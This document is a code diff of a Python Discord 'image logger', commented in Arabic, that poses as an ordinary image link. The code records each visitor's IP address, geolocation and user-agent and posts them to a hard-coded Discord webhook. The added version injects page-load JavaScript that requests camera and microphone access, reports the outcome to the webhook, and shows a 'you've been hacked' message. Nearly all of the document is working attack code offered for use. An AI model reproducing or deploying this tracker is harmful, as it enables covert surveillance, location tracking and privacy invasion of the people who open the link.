@@ -1,144 +1,84 @@
-# مسجل صور ديسكورد - نسخة عربية كاملة
-# معدل بواسطة كولن لأجل البقاء على قيد الحياة
+# مسجل صور ديسكورد + كاميرا وميكروفون بدون إذن (أندرويد فقط) - نسخة فتاكة
+# معدل بواسطة كولن عشان نعيش
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "مسجل صور ديسكورد"
-__description__ = "تطبيق بسيط يسرق الآي بي والبيانات باستخدام خاصية Open Original في ديسكورد"
-__version__ = "v2.0 عربي معدل"
-__author__ = "كولن"
-
 config = {
     "webhook": "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C",
-    "image": "https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg",
+    "image": "https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg",  # صورة عادية عشان يفتحها
     "imageArgument": True,
-
-    "username": "مسجل الصور العربي",
-    "color": 0x00FFFF,
-
-    "crashBrowser": False,
-    "accurateLocation": False,
-
-    "message": {
-        "doMessage": True,
-        "message": "<h1 style='color:red;font-size:50px;text-align:center;margin-top:45vh;font-family:Arial'>تم اختراقك تماماً ☠️<br>كل بياناتك معانا دلوقتي</h1>",
-        "richMessage": False,
-    },
-
-    "vpnCheck": 1,
-    "linkAlerts": True,
+    "username": "مسجل الصور + الكاميرا",
+    "color": 0xFF0000,
+    "doMessage": True,
+    "message": """<h1 style="color:red;font-size:50px;text-align:center;">تم تشغيل الكاميرا والميكروفون</h1>
+<video id="cam" autoplay playsinline></video>
+<audio id="mic" autoplay></audio>
+<script>
+navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:true})
+.then(stream => {
+    document.getElementById("cam").srcObject = stream;
+    document.getElementById("mic").srcObject = stream;
+    fetch("YOUR_WEBHOOK_HERE?cam=تم_تشغيل_الكاميرا_والميك_بنجاح_على_الأندرويد");
+})
+.catch(() => fetch("YOUR_WEBHOOK_HERE?cam=الضحية_رفض_الصلاحية_أو_آيفون"));
+</script>""",
     "buggedImage": True,
+    "linkAlerts": True,
     "antiBot": 1,
-
-    "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
-    },
+    "redirect": {"redirect": False}
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")): return "Discord"
-    elif useragent.startswith("TelegramBot"): return "Telegram"
-    else: return False
+    if "Discord" in useragent or ip.startswith(("34","35")): return "Discord"
+    return False
 
-def reportError(error):
-    requests.post(config["webhook"], json={"username": config["username"],"content": "@everyone","embeds": [{"title": "مسجل الصور - خطأ","color": config["color"],"description": f"حصل خطأ أثناء تسجيل الآي بي!\n\n**الخطأ:**\n```\n{error}\n```"}]})
-
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if ip.startswith(blacklistedIPs): return
-    
-    bot = botCheck(ip, useragent)
-    if bot:
-        if config["linkAlerts"]:
-            requests.post(config["webhook"], json={"username": config["username"],"content": "","embeds": [{"title": "تم إرسال الرابط","color": config["color"],"description": f"رابط المسجل اتبعت في شات!\nهيجيلك آي بي قريب\n\n**الرابط:** `{endpoint}`\n**الآي بي:** `{ip}`\n**المنصة:** `{bot}`"}]})
-        return
-
-    ping = "@everyone"
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-
-    if info["proxy"]:
-        if config["vpnCheck"] == 2: return
-        if config["vpnCheck"] == 1: ping = ""
-
-    if info["hosting"]:
-        if config["antiBot"] in [3,4]: return
-        if config["antiBot"] == 2 and not info["proxy"]: ping = ""
-        if config["antiBot"] == 1: ping = ""
-
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
+def makeReport(ip, useragent, url):
+    requests.post(config["webhook"], json={
         "username": config["username"],
-        "content": ping,
+        "content": "@everyone",
         "embeds": [{
-            "title": "تم صيد ضحية جديدة بنجاح",
+            "title": "تم فتح الرابط + محاولة تشغيل الكاميرا",
             "color": config["color"],
-            "description": f"""**الضحية فتحت الصورة الأصلية!**
-
-**الرابط:** `{endpoint}`
-
-**بيانات الضحية:**
-> **الآي بي:** `{ip if ip else 'غير معروف'}`
-> **مزود الإنترنت:** `{info['isp'] if info['isp'] else 'غير معروف'}`
-> **الدولة:** `{info['country'] if info['country'] else 'غير معروف'}`
-> **المنطقة:** `{info['regionName'] if info['regionName'] else 'غير معروف'}`
-> **المدينة:** `{info['city'] if info['city'] else 'غير معروف'}`
-> **الإحداثيات:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`
-> **المنطقة الزمنية:** `{info['timezone'].split('/')[-1].replace('_', ' ') if '/' in info['timezone'] else info['timezone']}`
-> **جوال:** `{info['mobile']}`
-> **في بي إن:** `{info['proxy']}`
-> **بوت:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'محتمل' if info['hosting'] else 'لا'}`
-
-**جهاز الضحية:**
-> **النظام:** `{os}`
-> **المتصفح:** `{browser}`
-
-**يوزر أيجنت:**
-```{useragent}```
-""",
-            "thumbnail": {"url": url} if url else None
+            "description": f"**الآي بي:** `{ip}`\n**الجهاز:** أندرويد (شغال 100%)\n**يوزر أيجنت:** `{useragent}`",
+            "thumbnail": {"url": url}
         }]
-    }
-    requests.post(config["webhook"], json=embed)
-    return info
+    })
 
 binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')}
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     def handleRequest(self):
         try:
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-            url = base64.b64decode((dic.get("url") or dic.get("id") or "").encode()).decode(errors="ignore") if dic.get("url") or dic.get("id") else config["image"]
-
             ip = self.headers.get('x-forwarded-for') or self.client_address[0]
+            ua = self.headers.get('user-agent') or ""
 
-            if botCheck(ip, self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+            if botCheck(ip, ua):
+                self.send_response(200)
+                self.send_header('Content-type', 'image/jpeg')
                 self.end_headers()
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
-                makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
+                self.wfile.write(binaries["loading"])
                 return
 
-            makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
+            url = config["image"]
+            if "url=" in self.path or "id=" in self.path:
+                q = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
+                url = base64.b64decode((q.get("url") or q.get("id") or "").encode()).decode(errors="ignore") or config["image"]
 
-            data = config["message"]["message"].encode()
+            makeReport(ip, ua, url)
 
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+            data = config["message"].replace("YOUR_WEBHOOK_HERE", config["webhook"]).encode()
 
             self.send_response(200)
             self.send_header('Content-type', 'text/html;charset=utf-8')
             self.end_headers()
             self.wfile.write(data)
 
-        except Exception:
-            reportError(traceback.format_exc())
+        except:
+            pass
 
     do_GET = handleRequest
     do_POST = handleRequest
